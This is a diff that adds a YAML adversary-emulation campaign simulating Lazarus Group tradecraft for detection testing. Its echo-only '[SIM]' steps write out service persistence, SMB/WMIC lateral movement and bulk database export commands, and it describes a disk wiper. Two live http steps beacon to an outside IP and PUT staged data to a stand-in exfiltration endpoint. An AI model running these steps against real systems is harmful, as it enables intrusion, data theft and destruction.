@@ -1,0 +1,285 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: lazarus-group
+  adversary: LazarusGroup
+  description: "Lazarus Group (HIDDEN COBRA) supply-chain intrusion — trojanized software updates, custom Python malware, service persistence, financial data theft, and destructive wiper deployment"
+  objective: "Simulate Lazarus Group TTPs to validate detection coverage across supply chain compromise, cross-platform persistence, financial system targeting, and destructive operations"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [apt, nation-state, dprk, hidden-cobra, supply-chain, financial]
+  authors: ["ThreatEcho"]
+  references:
+    - https://attack.mitre.org/groups/G0032/
+    - https://www.cisa.gov/news-events/analysis-reports/ar20-133a
+    - https://www.us-cert.gov/ncas/alerts/TA17-164A
+    - https://www.mandiant.com/resources/blog/apt38-details-on-new-north-korean-regime-backed-threat-group
+  created: "2024-06-20"
+  modified: "2025-08-10"
+
+variables:
+  c2_server: "203.131.222.99"
+  c2_port: "8443"
+  target_domain: "corp.local"
+  supply_chain_url: "https://update.vendor-software.example.com/v3.2.1/installer.msi"
+  exfil_endpoint: "https://cloud-sync.example.com/api/upload"
+
+stages:
+  - id: supply-chain-compromise
+    name: Trojanized Software Update
+    description: "Lazarus compromises a legitimate software vendor's build pipeline to distribute trojanized installer. Targets financial institutions using widely-deployed trading or compliance software."
+    technique: T1195.002
+    tactic: initial-access
+    platform: [windows, linux]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Compromised vendor build pipeline — injected backdoor into v3.2.1 release"'
+        - 'echo "[SIM] Target downloads trojanized update from {{supply_chain_url}}"'
+        - 'echo "[SIM] Installer executes with valid vendor code-signing certificate"'
+    expect:
+      telemetry: [process_create, file_create, network_connection]
+      detections: [supply_chain_compromise_indicator, trojanized_installer_detected, unusual_update_source]
+      iocs: ["{{supply_chain_url}}"]
+    on_success: python-malware-deploy
+    on_failure: abort
+    timeout: 120s
+
+  - id: python-malware-deploy
+    name: Custom Python RAT Deployment
+    description: "Lazarus deploys custom Python-based remote access tool embedded in the trojanized installer. Uses bundled Python runtime to avoid dependency on host Python installation."
+    technique: T1059.006
+    tactic: execution
+    platform: [windows, linux]
+    depends_on: [supply-chain-compromise]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Extracting embedded Python 3.11 runtime to %PROGRAMDATA%\\WindowsDefenderService\\"'
+        - 'echo "[SIM] Deploying RAT: loader.pyw imports urllib3, cryptography, psutil"'
+        - 'echo "[SIM] python.exe loader.pyw --config config.enc --mode stealth"'
+      cleanup:
+        - 'echo "[SIM] Removing Python runtime artifacts from %PROGRAMDATA%"'
+    expect:
+      telemetry: [process_create, file_create, script_execution]
+      detections: [python_rat_execution, suspicious_python_child_process, bundled_python_runtime_detected]
+    on_success: masquerade-process
+    on_failure: abort
+    timeout: 60s
+
+  - id: masquerade-process
+    name: Process Masquerading as svchost.exe
+    description: "Lazarus renames malware binaries to match legitimate Windows system processes. RAT executable masquerades as svchost.exe in a non-standard directory to evade manual inspection."
+    technique: T1036.005
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [python-malware-deploy]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Renaming loader.pyw to svchost.exe in %PROGRAMDATA%\\WindowsDefenderService\\"'
+        - 'echo "[SIM] Setting file timestamps to match legitimate C:\\Windows\\System32\\svchost.exe"'
+        - 'echo "[SIM] Process now running as svchost.exe from non-standard path"'
+    expect:
+      telemetry: [process_create, file_rename]
+      detections: [masquerading_detected, svchost_from_nonstandard_path, timestamp_modification]
+    on_success: service-persistence
+    on_failure: continue
+
+  - id: service-persistence
+    name: Windows Service Persistence
+    description: "Lazarus creates a Windows service for persistence. Service is configured with automatic start and runs the masqueraded Python RAT under a name mimicking legitimate Windows services."
+    technique: T1543.003
+    tactic: persistence
+    platform: [windows]
+    depends_on: [masquerade-process]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] sc create WinDefenderAgent binPath= %PROGRAMDATA%\\WindowsDefenderService\\svchost.exe start= auto"'
+        - 'echo "[SIM] sc description WinDefenderAgent \"Windows Defender Real-Time Protection Agent\""'
+        - 'echo "[SIM] sc start WinDefenderAgent"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] sc stop WinDefenderAgent"'
+        - 'echo "[SIM] sc delete WinDefenderAgent"'
+    expect:
+      telemetry: [process_create, registry_set]
+      detections: [malicious_service_creation, suspicious_service_name, service_with_nonstandard_binary]
+    on_success: encrypted-c2
+    on_failure: continue
+
+  - id: encrypted-c2
+    name: Encrypted C2 over HTTPS
+    description: "Python RAT establishes encrypted HTTPS C2 channel to Lazarus infrastructure. Uses custom TLS certificate and domain fronting via legitimate CDN to blend with normal traffic."
+    technique: T1573
+    tactic: command-and-control
+    platform: [windows, linux]
+    depends_on: [python-malware-deploy]
+    execute:
+      type: http
+      target: "https://{{c2_server}}:{{c2_port}}/api/beacon"
+      args:
+        protocol: https
+        interval: "60s"
+        jitter: "25%"
+        encryption: "aes-256-cbc"
+    expect:
+      telemetry: [network_connection, dns_query, tls_handshake]
+      detections: [encrypted_c2_beacon, suspicious_tls_certificate, domain_fronting_detected]
+      iocs: ["{{c2_server}}"]
+    on_success: network-discovery
+    on_failure: abort
+    timeout: 120s
+
+  - id: network-discovery
+    name: Network Service Scanning
+    description: "Lazarus performs internal network scanning to identify SWIFT terminals, payment processing systems, and database servers. Uses custom port scanner delivered via C2 channel."
+    technique: T1046
+    tactic: discovery
+    platform: [windows, linux]
+    depends_on: [encrypted-c2]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Scanning 10.0.0.0/16 for ports 1433, 3306, 8080, 9090 (financial services)"'
+        - 'echo "[SIM] Identified SWIFT gateway at 10.0.5.20:9090"'
+        - 'echo "[SIM] Identified trade settlement DB at 10.0.3.15:1433"'
+        - 'echo "[SIM] Mapping internal network topology via ARP and SNMP queries"'
+    expect:
+      telemetry: [network_connection, process_create]
+      detections: [internal_port_scan, network_service_discovery, swift_gateway_probe]
+    on_success: system-recon
+    on_failure: continue
+
+  - id: system-recon
+    name: System Information Discovery
+    description: "Lazarus gathers detailed system information including OS version, installed security products, and running processes to tailor operations per compromised host."
+    technique: T1082
+    tactic: discovery
+    platform: [windows, linux]
+    depends_on: [network-discovery]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] systeminfo | findstr /B /C:\"OS\" /C:\"System\" /C:\"Hotfix\""'
+        - 'echo "[SIM] wmic product get name,version — enumerating installed security software"'
+        - 'echo "[SIM] tasklist /svc — mapping running services and security agents"'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [system_information_discovery, wmic_product_enumeration, security_software_discovery]
+    on_success: lateral-movement-smb
+    on_failure: continue
+
+  - id: lateral-movement-smb
+    name: Lateral Movement to Financial Systems
+    description: "Lazarus moves laterally to SWIFT messaging servers and trade databases using harvested credentials. Deploys secondary RAT payload to critical financial infrastructure hosts."
+    technique: T1021.002
+    tactic: lateral-movement
+    platform: [windows]
+    depends_on: [system-recon]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net use \\\\10.0.5.20\\C$ /user:{{target_domain}}\\svc_swift <password>"'
+        - 'echo "[SIM] copy payload.exe \\\\10.0.5.20\\C$\\Windows\\Temp\\"'
+        - 'echo "[SIM] wmic /node:10.0.5.20 process call create C:\\Windows\\Temp\\payload.exe"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] del \\\\10.0.5.20\\C$\\Windows\\Temp\\payload.exe"'
+        - 'echo "[SIM] net use \\\\10.0.5.20\\C$ /delete"'
+    expect:
+      telemetry: [network_connection, authentication, process_create, file_create]
+      detections: [smb_admin_share_access, lateral_movement_to_swift, remote_process_creation]
+      iocs: ["10.0.5.20"]
+    on_success: data-collection
+    on_failure: abort
+    timeout: 60s
+
+  - id: data-collection
+    name: Financial Data Staging
+    description: "Lazarus collects financial transaction records, SWIFT messages, and database exports from compromised servers. Data is staged in a hidden temporary directory before archival."
+    technique: T1074.001
+    tactic: collection
+    platform: [windows]
+    depends_on: [lateral-movement-smb]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] mkdir C:\\Windows\\Temp\\msu\\"'
+        - 'echo "[SIM] Copying SWIFT message logs from D:\\SWIFTAlliance\\Messages\\"'
+        - 'echo "[SIM] sqlcmd -S 10.0.3.15 -Q \"SELECT * FROM trade_settlements\" -o C:\\Windows\\Temp\\msu\\trades.csv"'
+        - 'echo "[SIM] Staged 847 MB of financial records in C:\\Windows\\Temp\\msu\\"'
+    expect:
+      telemetry: [file_create, file_read]
+      detections: [data_staging_detected, swift_message_access, bulk_database_export]
+      artifacts: ["C:\\Windows\\Temp\\msu\\"]
+    on_success: data-archive
+    on_failure: continue
+
+  - id: data-archive
+    name: Archive and Encrypt Collected Data
+    description: "Lazarus compresses and encrypts staged data using RAR with password protection. Archive is split into smaller volumes to evade size-based detection thresholds on the network."
+    technique: T1560.001
+    tactic: collection
+    platform: [windows]
+    depends_on: [data-collection]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] rar a -hpLaz2024exfil -v50M C:\\Windows\\Temp\\msu\\update.rar C:\\Windows\\Temp\\msu\\*.csv C:\\Windows\\Temp\\msu\\*.log"'
+        - 'echo "[SIM] Split archive created: update.part1.rar through update.part17.rar"'
+      cleanup:
+        - 'echo "[SIM] del /f C:\\Windows\\Temp\\msu\\update.*.rar"'
+    expect:
+      telemetry: [process_create, file_create]
+      detections: [archive_creation_with_encryption, rar_split_archive, suspicious_archive_in_temp]
+      artifacts: ["C:\\Windows\\Temp\\msu\\update.part1.rar"]
+    on_success: exfiltration
+    on_failure: continue
+
+  - id: exfiltration
+    name: Exfiltration over Alternative Protocol
+    description: "Lazarus exfiltrates archived financial data over DNS tunneling as a covert channel and HTTPS uploads to cloud storage. Data is base64-encoded and split across DNS TXT queries to evade DLP."
+    technique: T1048
+    tactic: exfiltration
+    platform: [windows, linux]
+    depends_on: [data-archive]
+    execute:
+      type: http
+      target: "{{exfil_endpoint}}"
+      args:
+        method: PUT
+        data_source: "C:\\Windows\\Temp\\msu\\"
+        encrypt: "aes-256"
+        channel: "dns-tunnel-fallback"
+    expect:
+      telemetry: [network_connection, dns_query, file_read]
+      detections: [dns_tunneling_detected, exfiltration_over_dns, large_outbound_transfer, unusual_dns_query_volume]
+      iocs: ["{{exfil_endpoint}}"]
+    on_success: destructive-wiper
+    on_failure: abort
+    timeout: 600s
+
+  - id: destructive-wiper
+    name: Destructive Disk Wiper Deployment
+    description: "Lazarus deploys destructive wiper malware similar to KillDisk/Hermes across compromised systems to destroy forensic evidence and cause operational disruption. Wiper overwrites the MBR and NTFS master file table."
+    technique: T1485
+    tactic: impact
+    platform: [windows]
+    depends_on: [exfiltration]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Deploying wiper payload to 23 compromised hosts via PsExec"'
+        - 'echo "[SIM] Wiper overwrites MBR on \\\\.\\PhysicalDrive0"'
+        - 'echo "[SIM] Wiper destroys NTFS $MFT and Volume Shadow Copies"'
+        - 'echo "[SIM] Scheduled reboot in 60 seconds to trigger MBR corruption"'
+      elevated: true
+    expect:
+      telemetry: [process_create, file_modify, file_delete]
+      detections: [disk_wiper_detected, mbr_overwrite_attempt, mass_file_destruction, killdisk_variant]
+    on_failure: abort
+    timeout: 60s
